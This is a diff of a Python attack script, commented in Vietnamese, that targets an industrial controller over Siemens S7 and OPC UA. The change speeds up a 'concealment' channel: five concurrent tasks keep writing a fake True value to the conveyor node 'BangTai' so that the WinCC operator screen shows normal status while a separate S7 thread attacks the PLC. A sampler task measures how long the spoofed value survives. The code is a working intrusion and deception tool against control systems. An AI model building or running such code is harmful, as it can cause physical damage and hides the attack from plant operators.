@@ -64,7 +64,11 @@ from snap7.util import get_bool, set_bool, get_dint
 from asyncua import Client, ua
 
 BANGTAI_NODE_ID = 'ns=3;s="BangTai"'
-CONCEAL_WRITE_INTERVAL_S = 0.01  # ~khong cho, de network round-trip tu lam gioi han toc do -- xem note trong opcua_conceal_loop
+CONCEAL_WORKERS = 5  # so luong task ghi CHAY SONG SONG tren cung 1 OPC UA session
+                      # (tan dung pipelining -- nhieu WriteRequest cho phan hoi
+                      # xen ke nhau, thay vi 1 luong tuan tu cho tung cai)
+SAMPLE_INTERVAL_S = 0.05  # tan suat doc lai de do ty le "dinh" (tach rieng
+                           # khoi vong ghi chinh de khong lam cham no)
 
 concealment_active = threading.Event()
 stop_all = threading.Event()
@@ -115,41 +119,69 @@ async def probe_bangtai_writable(opc_url: str) -> None:
         print(f"[!] Probe: BangTai TU CHOI ghi -- {probe_result['error']}")
 
 
-async def opcua_conceal_loop(opc_url: str, stats: dict) -> None:
-    """Chay song song voi luong S7: khi concealment_active dang bat, LIEN TUC
-    ghi True vao BangTai (khong chi 1 lan) vi khong biet chac PLC co tu lam
-    moi gia tri nay moi chu ky scan hay khong -- ghi lai lien tuc de toi da
-    hoa co hoi gia tri gia "dinh" duoc trong cua so ngan.
+async def _conceal_writer(node, stats: dict, worker_id: int) -> None:
+    """1 trong CONCEAL_WORKERS task ghi dong thoi, chay tren cung 1 OPC UA
+    session (asyncio don luong nen khong co race dieu kien du lieu -- cac
+    coroutine chi xen ke nhau tai diem await, khong chay that su song song).
+    KHONG doc lai o day -- do la viec cua _conceal_sampler rieng, vi doc lai
+    sau moi lan ghi se gan nhu GAP DOI so round-trip can cho MOI lan ghi,
+    trong khi muc tieu cua worker nay la toi da hoa SO LAN GHI/GIAY, khong
+    phai xac minh tung lan."""
+    while not stop_all.is_set():
+        if concealment_active.is_set():
+            stats["attempts"] += 1
+            try:
+                await write_value_only(node, True)
+                stats["succeeded"] += 1
+            except Exception as e:
+                stats["failed"] += 1
+                if stats["failed"] <= 3:  # tranh spam log neu loi lap lai lien tuc
+                    print(f"[WARN] Worker {worker_id} ghi that bai: {type(e).__name__}: {e}")
+        else:
+            await asyncio.sleep(0.05)  # khong tan cong dang dien ra, giam tai vo ich
 
-    Sau moi lan ghi, doc lai NGAY de biet gia tri co "dinh" duoc den lan doc
-    hay da bi PLC ghi de that ngay trong khoang round-trip do -- day la bang
-    chung truc tiep cho cuoc dua thoi gian (PLC tu lam moi vs toc do ghi lai
-    cua minh), thay vi chi suy doan tu quan sat mat thuong tren WinCC."""
+
+async def _conceal_sampler(node, stats: dict) -> None:
+    """Doc lai DINH KY (khong phai sau moi lan ghi) de do ty le gia tri gia
+    "dinh" duoc toi luc doc -- tach rieng khoi cac writer de khong lam cham
+    chung, van cho ra so lieu thong ke y nghia."""
+    stats["readback_still_true"] = 0
+    stats["readback_reverted"] = 0
+    while not stop_all.is_set():
+        if concealment_active.is_set():
+            try:
+                v = await node.read_value()
+                if v is True:
+                    stats["readback_still_true"] += 1
+                else:
+                    stats["readback_reverted"] += 1
+            except Exception:
+                pass
+        await asyncio.sleep(SAMPLE_INTERVAL_S)
+
+
+async def opcua_conceal_loop(opc_url: str, stats: dict) -> None:
+    """Chay song song voi luong S7: khi concealment_active dang bat,
+    CONCEAL_WORKERS task cung ghi lien tuc True vao BangTai qua chung 1
+    session (pipelining -- nhieu WriteRequest cho phan hoi xen ke, thay vi
+    1 luong tuan tu cho tung cai) de toi da hoa tan suat ghi/giay, tang co
+    hoi gia tri gia "dinh" duoc truoc khi PLC tu lam moi gia tri that. Mot
+    task _conceal_sampler rieng doc lai dinh ky (khong lam cham cac writer)
+    de do ty le thanh cong thuc te, thay vi chi suy doan tu quan sat mat
+    thuong tren WinCC."""
     stats["attempts"] = 0
     stats["succeeded"] = 0
     stats["failed"] = 0
-    stats["readback_still_true"] = 0
-    stats["readback_reverted"] = 0
     try:
         async with Client(url=opc_url, timeout=5) as client:
             node = client.get_node(BANGTAI_NODE_ID)
-            print(f"[+] OPC UA concealment channel connected: {opc_url}")
-            while not stop_all.is_set():
-                if concealment_active.is_set():
-                    stats["attempts"] += 1
-                    try:
-                        await write_value_only(node, True)
-                        stats["succeeded"] += 1
-                        readback = await node.read_value()
-                        if readback is True:
-                            stats["readback_still_true"] += 1
-                        else:
-                            stats["readback_reverted"] += 1
-                    except Exception as e:
-                        stats["failed"] += 1
-                        if stats["failed"] <= 3:  # tranh spam log neu loi lap lai moi vong
-                            print(f"[WARN] Concealment write that bai: {type(e).__name__}: {e}")
-                await asyncio.sleep(CONCEAL_WRITE_INTERVAL_S)
+            print(f"[+] OPC UA concealment channel connected: {opc_url} ({CONCEAL_WORKERS} writer song song)")
+            writers = [
+                asyncio.create_task(_conceal_writer(node, stats, i))
+                for i in range(CONCEAL_WORKERS)
+            ]
+            sampler = asyncio.create_task(_conceal_sampler(node, stats))
+            await asyncio.gather(*writers, sampler)
     except Exception as e:
         print(f"[ERR] OPC UA concealment loop: {e}")
     finally:
